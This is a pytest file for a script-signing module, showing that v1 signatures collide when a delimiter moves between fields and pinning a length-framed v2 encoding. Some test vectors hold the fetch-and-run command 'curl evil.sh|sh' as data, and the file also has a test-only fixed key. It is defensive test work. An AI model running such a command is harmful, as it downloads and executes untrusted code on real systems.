"""Versioned compute script signatures (#2484).

v1 signatures hash ``name|language|content|purpose`` with an unframed ``|``,
so moving one between adjacent fields leaves the digest unchanged. v2 signs a
length-framed, domain-tagged encoding with the version inside the signed
bytes. These tests pin the v2 encoding with fixed vectors, demonstrate the v1
collision, and cover the compatibility window, unknown versions, and
single-field tampering on both the ECDSA and the hybrid signing paths.
"""

from __future__ import annotations

import base64
import hashlib
import logging
import unicodedata

import pytest
from cryptography.hazmat.primitives.asymmetric import ec

from kestrel_sovereign.features.compute.models import ComputeScript
from kestrel_sovereign.features.compute.script_signer import (
    ACCEPT_LEGACY_SIGNATURES_ENV,
    ScriptSignatureEncodingError,
    ScriptSigner,
    _legacy_v1_signing_message,
    accept_legacy_signatures_from_env,
    canonical_script_bytes_v2,
)
from kestrel_sovereign.security.crypto_suite import (
    ALG_ECDSA_SECP256K1_SHA256,
    get_suite,
)

SIGNER_LOGGER = "kestrel_sovereign.features.compute.script_signer"
SIGNED_FIELDS = ("name", "language", "content", "purpose")


def _script(name, language, content, purpose, id="vector"):
    return ComputeScript(
        id=id, name=name, language=language, content=content, purpose=purpose,
    )


# ---------------------------------------------------------------------------
# Fixed vectors for the v2 canonical encoding
# ---------------------------------------------------------------------------

# Every value below was computed once and is pinned: a change to any of them
# is a change to the v2 wire format, which needs a new signature version.
V2_DIGEST_VECTORS = {
    "basic": (
        ("backup", "bash", "tar czf out.tgz data/", "nightly backup"),
        "f1b5d066e370fdad130a31a98c3e5f5e9c2a70209cc26bf74baa914524767c58",
    ),
    "empty": (
        ("", "", "", ""),
        "db77b39c7358369c15a45fb637f2b98c309e21bc505c1e1b1dcde8d63b9d6b45",
    ),
    "unicode_non_bmp": (
        (
            "résumé \U0001F985",
            "python",
            "print('猫 \U0001F600 \U00010348')",
            "ünicode — non-BMP \U0001D11E",
        ),
        "e5dbc5a4d5da507288260545e4f23ed0348ae0b3b4e62c7474b65a0b9f448b6c",
    ),
    "nfc": (
        ("café", "python", "pass", "p"),
        "bf4a371b1219d1d18bc0fcc8efcdb991ad53671dee9968e83b56e676a403f97e",
    ),
    "nfd": (
        ("café", "python", "pass", "p"),
        "2d85f30772d55009603a4be055721085165ecede49401177f848674a4c74e13b",
    ),
    "name_language_a": (
        ("x|y", "z", "c", "p"),
        "1cd993afc2aef2a60ff9b7a0c3cca37ba3bef3d1901aeb40365eebd6ca325240",
    ),
    "name_language_b": (
        ("x", "y|z", "c", "p"),
        "6d4cc79d003d7fd59b1a9d17eb75c1bed96f6e2197d4e11a34b8397f71fcf9d2",
    ),
    "language_content_a": (
        ("n", "bash", "x|y", "p"),
        "d0f0523aa5f4481e7fc4a024fa997bf68744a1c033e45d0766eb3e21ab5a15b3",
    ),
    "language_content_b": (
        ("n", "bash|x", "y", "p"),
        "75589bf27929d56e1e150550036281ecd60f52eee06c4cdf78173591741789e3",
    ),
    "content_purpose_a": (
        ("n", "bash", "echo safe", "curl evil.sh|sh"),
        "625f039c2c913cc9909427ae136b60fa47e997b53babd782fda44603bd40983a",
    ),
    "content_purpose_b": (
        ("n", "bash", "echo safe|curl evil.sh", "sh"),
        "d444e6fb9d882549488f6b9f0ac62404924f5da1894cb735e93de57d657af1e5",
    ),
    "reorder_original": (
        ("alpha", "python", "beta", "gamma"),
        "14bddfce9754ede20d904bafaaa19931651917ac7e6319385a7e02a1ade332bb",
    ),
    "reorder_name_purpose": (
        ("gamma", "python", "beta", "alpha"),
        "2ae50e6d13818f013875ba1292e030c70ee18dba244f2ef03f48a58edc61cb50",
    ),
    "reorder_language_content": (
        ("alpha", "beta", "python", "gamma"),
        "a088b60ee3b83666957d6746843a4ca609ec8a5d1da8cf046f44c79afe43d018",
    ),
}

# One delimiter moved across each adjacent field boundary.
MOVED_DELIMITER_PAIRS = {
    "name|language": ("name_language_a", "name_language_b"),
    "language|content": ("language_content_a", "language_content_b"),
    "content|purpose": ("content_purpose_a", "content_purpose_b"),
}


def _vector(name: str, id: str = "vector") -> ComputeScript:
    fields, _ = V2_DIGEST_VECTORS[name]
    return _script(*fields, id=id)


def test_v2_canonical_layout_fixed_vector():
    """The full byte layout, for all-empty fields: u64-BE length frames for
    the domain tag, the version, then each field's name and value."""
    expected = bytes.fromhex(
        "0000000000000020"
        + b"kestrel.compute.script-signature".hex()
        + "0000000000000001" + b"2".hex()
        + "0000000000000004" + b"name".hex() + "0000000000000000"
        + "0000000000000008" + b"language".hex() + "0000000000000000"
        + "0000000000000007" + b"content".hex() + "0000000000000000"
        + "0000000000000007" + b"purpose".hex() + "0000000000000000"
    )
    assert canonical_script_bytes_v2(_vector("empty")) == expected
    assert expected.hex() == (
        "00000000000000206b65737472656c2e636f6d707574652e7363726970742d736967"
        "6e617475726500000000000000013200000000000000046e616d6500000000000000"
        "0000000000000000086c616e67756167650000000000000000000000000000000763"
        "6f6e74656e7400000000000000000000000000000007707572706f73650000000000"
        "000000"
    )


@pytest.mark.parametrize("name", sorted(V2_DIGEST_VECTORS))
def test_v2_canonical_digest_fixed_vectors(name):
    fields, digest = V2_DIGEST_VECTORS[name]
    canonical = canonical_script_bytes_v2(_script(*fields))
    assert hashlib.sha256(canonical).hexdigest() == digest


def _decode_frames(data: bytes) -> list[bytes]:
    frames, offset = [], 0
    while offset < len(data):
        length = int.from_bytes(data[offset:offset + 8], "big")
        offset += 8
        assert offset + length <= len(data), "frame overruns the encoding"
        frames.append(data[offset:offset + length])
        offset += length
    return frames


def _frame_text(text: str) -> str:
    encoded = text.encode("utf-8")
    return (len(encoded).to_bytes(8, "big") + encoded).decode("latin-1")


ADVERSARIAL_FIELDS = [
    # A value carrying what would be the encoding of the following frames.
    ("n", "bash", "echo a" + _frame_text("purpose") + _frame_text("p"), "p"),
    ("n" + _frame_text("language"), "bash", "c", "p"),
    ("|", "|", "|", "|"),
    ("\x00", "", "\x00\x00", "\x00" * 9),
    ("purpose", "content", "language", "name"),
]


@pytest.mark.parametrize(
    "fields",
    [fields for fields, _ in V2_DIGEST_VECTORS.values()] + ADVERSARIAL_FIELDS,
)
def test_v2_encoding_decodes_back_to_exactly_its_fields(fields):
    """The encoding is injective: parsing it yields the domain tag, the
    version, and each field's name and value, and nothing else."""
    frames = _decode_frames(canonical_script_bytes_v2(_script(*fields)))
    assert frames == [b"kestrel.compute.script-signature", b"2"] + [
        part
        for name, value in zip(SIGNED_FIELDS, fields)
        for part in (name.encode("ascii"), value.encode("utf-8"))
    ]


def test_every_fixed_vector_encodes_distinctly():
    encodings = {
        canonical_script_bytes_v2(_vector(name)) for name in V2_DIGEST_VECTORS
    }
    assert len(encodings) == len(V2_DIGEST_VECTORS)


@pytest.mark.parametrize("boundary", sorted(MOVED_DELIMITER_PAIRS))
def test_moved_delimiter_collides_under_v1_but_not_v2(boundary):
    a_name, b_name = MOVED_DELIMITER_PAIRS[boundary]
    a, b = _vector(a_name), _vector(b_name)
    assert (a.name, a.language, a.content, a.purpose) != (
        b.name, b.language, b.content, b.purpose
    )
    assert _legacy_v1_signing_message(a) == _legacy_v1_signing_message(b)
    assert canonical_script_bytes_v2(a) != canonical_script_bytes_v2(b)


@pytest.mark.parametrize(
    "pair",
    [
        ("reorder_original", "reorder_name_purpose"),
        ("reorder_original", "reorder_language_content"),
    ],
)
def test_field_reordering_changes_v2_bytes(pair):
    first, second = (_vector(name) for name in pair)
    assert sorted((first.name, first.language, first.content, first.purpose)) == sorted(
        (second.name, second.language, second.content, second.purpose)
    )
    assert canonical_script_bytes_v2(first) != canonical_script_bytes_v2(second)


def test_unicode_is_bound_as_exact_utf8_without_normalisation():
    script = _vector("unicode_non_bmp")
    canonical = canonical_script_bytes_v2(script)
    for field_name in SIGNED_FIELDS:
        encoded = getattr(script, field_name).encode("utf-8")
        assert len(encoded).to_bytes(8, "big") + encoded in canonical
    assert "\U0001F985".encode("utf-8") in canonical

    nfc, nfd = _vector("nfc"), _vector("nfd")
    assert unicodedata.normalize("NFC", nfd.name) == nfc.name
    assert canonical_script_bytes_v2(nfc) != canonical_script_bytes_v2(nfd)


def test_empty_fields_are_distinguished_by_position():
    """An empty field cannot absorb a neighbour's value."""
    variants = [
        _script("x", "", "", ""),
        _script("", "x", "", ""),
        _script("", "", "x", ""),
        _script("", "", "", "x"),
    ]
    assert len({canonical_script_bytes_v2(v) for v in variants}) == 4
    assert len({_legacy_v1_signing_message(v) for v in variants}) == 4


@pytest.mark.parametrize("field_name", SIGNED_FIELDS)
def test_unencodable_field_is_refused(field_name):
    lone_surrogate = _script("n", "python", "c", "p")
    setattr(lone_surrogate, field_name, "a\ud800b")
    with pytest.raises(ScriptSignatureEncodingError, match=field_name):
        canonical_script_bytes_v2(lone_surrogate)

    not_a_str = _script("n", "python", "c", "p")
    setattr(not_a_str, field_name, None)
    with pytest.raises(ScriptSignatureEncodingError, match=field_name):
        canonical_script_bytes_v2(not_a_str)


# ---------------------------------------------------------------------------
# ECDSA path with a fixed test key
# ---------------------------------------------------------------------------

# A test-only secp256k1 key derived from a fixed scalar, and two signatures
# produced with it once and pinned: a pre-#2484 untagged v1 signature, and a
# v2 signature. They prove a stored signature keeps verifying across releases.
FIXED_SCALAR = int("2484" * 16, 16)
FIXED_SCRIPT_FIELDS = (
    "fixed vector", "python", "print('fixed')", "pin the wire format",
)
FIXED_SCRIPT_ID = "fixed-vector-0001"
FIXED_V1_SIGNATURE = (
    "ecdsa:MEUCIAoj5HjJwmSRF8WONhMNmtN4TI4tLBpWi/1Lct/17WsuAiEAoK5aWN6OYCOE3LnD"
    "p/MoXCb/hkYHIAHEbjBcvxbZF3k="
)
FIXED_V2_SIGNATURE = (
    "v2:ecdsa:MEUCIDLfZMG/IpRwJ0SczCSTa5/WhmI41G55U3x3DRQXl9IvAiEAyhRBt/h7GgKN"
    "x5Eo9eJ0oXFQowKO9o2x4kSaAxnSoLo="
)


def _fixed_script(signature=None) -> ComputeScript:
    script = _script(*FIXED_SCRIPT_FIELDS, id=FIXED_SCRIPT_ID)
    script.signature = signature
    return script


def _ecdsa_signer(tmp_path, *, accept_legacy_signatures=True) -> ScriptSigner:
    signer = ScriptSigner(
        "did:ethr:0xfixed",
        str(tmp_path / "scripts.db"),
        accept_legacy_signatures=accept_legacy_signatures,
    )
    signer._private_key = ec.derive_private_key(FIXED_SCALAR, ec.SECP256K1())
    signer._public_key = signer._private_key.public_key()

    async def _keys_loaded():
        return True

    signer._load_keys = _keys_loaded
    return signer


def _v1_ecdsa_signature(signer: ScriptSigner, script: ComputeScript) -> str:
    """Produce an untagged v1 signature the way pre-#2484 releases did."""
    suite = get_suite(ALG_ECDSA_SECP256K1_SHA256)
    raw = suite.sign(_legacy_v1_signing_message(script), signer._private_key)
    return "ecdsa:" + base64.b64encode(raw).decode()


def _warnings(caplog):
    return [
        r.getMessage() for r in caplog.records
        if r.name == SIGNER_LOGGER and r.levelno == logging.WARNING
    ]


@pytest.mark.asyncio
async def test_fixed_v2_vector_verifies_without_legacy_warning(tmp_path, caplog):
    signer = _ecdsa_signer(tmp_path)
    caplog.set_level(logging.WARNING, logger=SIGNER_LOGGER)
    assert await signer.verify(_fixed_script(FIXED_V2_SIGNATURE)) is True
    assert not any("legacy v1" in m for m in _warnings(caplog))


@pytest.mark.asyncio
async def test_fixed_v1_vector_verifies_with_warning_naming_the_script(tmp_path, caplog):
    signer = _ecdsa_signer(tmp_path)
    caplog.set_level(logging.WARNING, logger=SIGNER_LOGGER)
    assert await signer.verify(_fixed_script(FIXED_V1_SIGNATURE)) is True
    legacy = [m for m in _warnings(caplog) if "legacy v1 signature" in m]
    assert len(legacy) == 1
    assert FIXED_SCRIPT_ID in legacy[0]
    assert ACCEPT_LEGACY_SIGNATURES_ENV in legacy[0]


@pytest.mark.asyncio
async def test_fixed_v1_vector_refused_when_window_closed(tmp_path, caplog):
    signer = _ecdsa_signer(tmp_path, accept_legacy_signatures=False)
    caplog.set_level(logging.WARNING, logger=SIGNER_LOGGER)
    assert await signer.verify(_fixed_script(FIXED_V1_SIGNATURE)) is False
    refusals = [m for m in _warnings(caplog) if "window is closed" in m]
    assert len(refusals) == 1
    assert FIXED_SCRIPT_ID in refusals[0]
    # The closed window never touches v2.
    assert await signer.verify(_fixed_script(FIXED_V2_SIGNATURE)) is True


@pytest.mark.asyncio
async def test_new_ecdsa_signature_is_v2_over_canonical_bytes(tmp_path):
    signer = _ecdsa_signer(tmp_path)
    script = _fixed_script()
    signature = await signer.sign(script)
    assert signature.startswith("v2:ecdsa:")

    raw = base64.b64decode(signature[len("v2:ecdsa:"):])
    suite = get_suite(ALG_ECDSA_SECP256K1_SHA256)
    assert suite.verify(canonical_script_bytes_v2(script), raw, signer._public_key)
    assert not suite.verify(_legacy_v1_signing_message(script), raw, signer._public_key)

    script.signature = signature
    assert await signer.verify(script) is True


@pytest.mark.asyncio
async def test_sign_and_update_replaces_v1_with_v2(tmp_path):
    signer = _ecdsa_signer(tmp_path)
    script = _fixed_script(FIXED_V1_SIGNATURE)
    await signer.sign_and_update(script)
    assert script.signature.startswith("v2:ecdsa:")
    assert await signer.verify(script) is True


@pytest.mark.asyncio
@pytest.mark.parametrize("boundary", sorted(MOVED_DELIMITER_PAIRS))
async def test_v1_moved_delimiter_forgery_demonstrated_then_refused_under_v2(
    tmp_path, boundary,
):
    a_name, b_name = MOVED_DELIMITER_PAIRS[boundary]
    open_window = _ecdsa_signer(tmp_path)
    closed_window = _ecdsa_signer(tmp_path, accept_legacy_signatures=False)

    signed = _vector(a_name, id="signed")
    forged = _vector(b_name, id="forged")

    # v1: a signature over one script verifies for a different script.
    forged.signature = _v1_ecdsa_signature(open_window, signed)
    assert await open_window.verify(forged) is True
    assert await closed_window.verify(forged) is False

    # v2: the same move no longer carries the signature over.
    signed.signature = await open_window.sign(signed)
    assert await open_window.verify(signed) is True
    forged.signature = signed.signature
    assert await open_window.verify(forged) is False


@pytest.mark.asyncio
@pytest.mark.parametrize("field_name", SIGNED_FIELDS)
@pytest.mark.parametrize("version", ["v2", "v1"])
async def test_tampering_any_single_field_fails_ecdsa(tmp_path, field_name, version):
    signer = _ecdsa_signer(tmp_path)
    script = _fixed_script()
    if version == "v2":
        script.signature = await signer.sign(script)
    else:
        script.signature = _v1_ecdsa_signature(signer, script)
    assert await signer.verify(script) is True

    setattr(script, field_name, getattr(script, field_name) + "!")
    assert await signer.verify(script) is False


@pytest.mark.asyncio
@pytest.mark.parametrize("tag", ["v3:", "v1:", "v0:", "v02:", "v20:", "v99999:"])
async def test_unknown_version_tags_refused_never_verified_as_v1(tmp_path, caplog, tag):
    signer = _ecdsa_signer(tmp_path)
    caplog.set_level(logging.WARNING, logger=SIGNER_LOGGER)

    # A tag in front of a body that verifies as v2 ...
    v2_body = FIXED_V2_SIGNATURE[len("v2:"):]
    assert await signer.verify(_fixed_script(tag + v2_body)) is False
    # ... and in front of a body that verifies as v1.
    assert await signer.verify(_fixed_script(tag + FIXED_V1_SIGNATURE)) is False

    unknown = [m for m in _warnings(caplog) if "version tag" in m]
    assert len(unknown) == 2
    assert all(repr(tag) in m for m in unknown)
    assert not any("legacy v1 signature" in m for m in _warnings(caplog))


@pytest.mark.asyncio
async def test_version_tag_cannot_be_stripped_or_added(tmp_path):
    """The version lives inside the signed bytes, so relabelling a valid
    signature as the other version does not verify."""
    signer = _ecdsa_signer(tmp_path)
    stripped = FIXED_V2_SIGNATURE[len("v2:"):]
    assert stripped.startswith("ecdsa:")
    assert await signer.verify(_fixed_script(stripped)) is False
    assert await signer.verify(_fixed_script("v2:" + FIXED_V1_SIGNATURE)) is False


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "signature",
    ["v2:", "v2:ecdsa", "v2:hmac:AAAA", "v2:rsapss:AAAA", "v2:v2:ecdsa:AAAA"],
)
async def test_v2_with_unknown_scheme_refused(tmp_path, signature):
    signer = _ecdsa_signer(tmp_path)
    assert await signer.verify(_fixed_script(signature)) is False


@pytest.mark.asyncio
async def test_sign_refuses_unencodable_field(tmp_path):
    signer = _ecdsa_signer(tmp_path)
    script = _fixed_script()
    script.content = "print('\ud800')"
    with pytest.raises(ScriptSignatureEncodingError):
        await signer.sign(script)


@pytest.mark.asyncio
@pytest.mark.parametrize("signature", [FIXED_V2_SIGNATURE, FIXED_V1_SIGNATURE])
async def test_verify_refuses_unencodable_field(tmp_path, signature):
    signer = _ecdsa_signer(tmp_path)
    script = _fixed_script(signature)
    script.purpose = "\udfff"
    assert await signer.verify(script) is False


# ---------------------------------------------------------------------------
# Hybrid path (Ed25519 + ML-DSA-65) on a post-ceremony identity
# ---------------------------------------------------------------------------

@pytest.fixture
def hybrid_signer_factory(post_ceremony_material):
    storage_dir = post_ceremony_material.storage_dir
    address = post_ceremony_material.legacy_did.split(":")[-1]

    def make(*, accept_legacy_signatures=True) -> ScriptSigner:
        return ScriptSigner(
            f"did:ethr:{address}",
            str(storage_dir / "scripts.db"),
            accept_legacy_signatures=accept_legacy_signatures,
        )

    return make


async def _v1_hybrid_signature(signer: ScriptSigner, script: ComputeScript) -> str:
    """Produce an untagged v1 hybrid signature the way pre-#2484 releases did."""
    import json

    from kestrel_sovereign.identity.hybrid_keypair import sign_hybrid

    assert await signer._load_keys() is True
    identity = signer._agent_identity
    vms = identity.new_verification_methods
    entries = sign_hybrid(
        _legacy_v1_signing_message(script),
        identity.hybrid_keypair,
        classical_kid=vms[0]["id"].rsplit("#", 1)[-1],
        pq_kid=vms[1]["id"].rsplit("#", 1)[-1],
    )
    return "hybrid:" + base64.b64encode(json.dumps(entries).encode()).decode()


@pytest.mark.asyncio
async def test_hybrid_v2_round_trip_signs_canonical_bytes(hybrid_signer_factory):
    import json

    signer = hybrid_signer_factory()
    script = _fixed_script()
    script.signature = await signer.sign(script)
    assert script.signature.startswith("v2:hybrid:")
    assert await signer.verify(script) is True

    entries = json.loads(base64.b64decode(script.signature[len("v2:hybrid:"):]))
    assert {e["alg"] for e in entries} == {"ed25519", "ml-dsa-65"}
    keypair = signer._agent_identity.hybrid_keypair
    for entry in entries:
        half = keypair.classical if entry["alg"] == "ed25519" else keypair.pq
        assert get_suite(entry["alg"]).verify(
            canonical_script_bytes_v2(script),
            bytes.fromhex(entry["sig"]),
            half.public_key,
        )


@pytest.mark.asyncio
@pytest.mark.parametrize("field_name", SIGNED_FIELDS)
async def test_tampering_any_single_field_fails_hybrid(hybrid_signer_factory, field_name):
    signer = hybrid_signer_factory()
    script = _fixed_script()
    script.signature = await signer.sign(script)
    setattr(script, field_name, getattr(script, field_name) + "!")
    assert await signer.verify(script) is False


@pytest.mark.asyncio
async def test_hybrid_moved_delimiter_signature_does_not_carry_over(hybrid_signer_factory):
    signer = hybrid_signer_factory()
    signed = _vector("content_purpose_a", id="signed")
    forged = _vector("content_purpose_b", id="forged")
    forged.signature = await _v1_hybrid_signature(signer, signed)
    assert await signer.verify(forged) is True  # the v1 collision

    forged.signature = await signer.sign(signed)
    assert await signer.verify(forged) is False


@pytest.mark.asyncio
async def test_hybrid_v1_signature_verifies_with_warning(hybrid_signer_factory, caplog):
    signer = hybrid_signer_factory()
    script = _fixed_script()
    script.signature = await _v1_hybrid_signature(signer, script)
    caplog.set_level(logging.WARNING, logger=SIGNER_LOGGER)
    assert await signer.verify(script) is True
    legacy = [m for m in _warnings(caplog) if "legacy v1 signature" in m]
    assert len(legacy) == 1
    assert FIXED_SCRIPT_ID in legacy[0]


@pytest.mark.asyncio
async def test_hybrid_v1_signature_refused_when_window_closed(hybrid_signer_factory):
    script = _fixed_script()
    script.signature = await _v1_hybrid_signature(hybrid_signer_factory(), script)
    signer = hybrid_signer_factory(accept_legacy_signatures=False)
    assert await signer.verify(script) is False


@pytest.mark.asyncio
async def test_hybrid_unknown_version_refused(hybrid_signer_factory):
    signer = hybrid_signer_factory()
    script = _fixed_script()
    v2_signature = await signer.sign(script)
    script.signature = "v3:" + v2_signature[len("v2:"):]
    assert await signer.verify(script) is False
    script.signature = "v3:" + await _v1_hybrid_signature(signer, script)
    assert await signer.verify(script) is False


# ---------------------------------------------------------------------------
# The compatibility-window switch
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "environ, expected",
    [
        ({}, True),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: ""}, True),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: "true"}, True),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: " TRUE "}, True),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: "1"}, True),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: "false"}, False),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: "False"}, False),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: "0"}, False),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: "no"}, False),
        ({ACCEPT_LEGACY_SIGNATURES_ENV: "off"}, False),
    ],
)
def test_window_switch_parsing(environ, expected):
    assert accept_legacy_signatures_from_env(environ) is expected


@pytest.mark.parametrize("value", ["flase", "2", "closed", "tru"])
def test_window_switch_rejects_unrecognised_values(value):
    with pytest.raises(ValueError, match=ACCEPT_LEGACY_SIGNATURES_ENV):
        accept_legacy_signatures_from_env({ACCEPT_LEGACY_SIGNATURES_ENV: value})


def test_signer_accepts_legacy_by_default(tmp_path):
    assert ScriptSigner(None, str(tmp_path / "x.db")).accept_legacy_signatures is True


@pytest.mark.asyncio
@pytest.mark.parametrize("value, expected", [(None, True), ("false", False), ("true", True)])
async def test_compute_feature_applies_window_switch(tmp_path, monkeypatch, value, expected):
    from types import SimpleNamespace

    from kestrel_sovereign.features.compute import ComputeFeature

    if value is None:
        monkeypatch.delenv(ACCEPT_LEGACY_SIGNATURES_ENV, raising=False)
    else:
        monkeypatch.setenv(ACCEPT_LEGACY_SIGNATURES_ENV, value)
    agent = SimpleNamespace(
        storage_path=str(tmp_path / "kestrel_prime.db"), did="did:ethr:0xfeature",
    )
    feature = ComputeFeature(agent)
    await feature.initialize()
    assert feature.signer.accept_legacy_signatures is expected


@pytest.mark.asyncio
async def test_compute_feature_refuses_unrecognised_window_switch(tmp_path, monkeypatch):
    from types import SimpleNamespace

    from kestrel_sovereign.features.compute import ComputeFeature

    monkeypatch.setenv(ACCEPT_LEGACY_SIGNATURES_ENV, "flase")
    agent = SimpleNamespace(
        storage_path=str(tmp_path / "kestrel_prime.db"), did="did:ethr:0xfeature",
    )
    with pytest.raises(ValueError, match=ACCEPT_LEGACY_SIGNATURES_ENV):
        await ComputeFeature(agent).initialize()
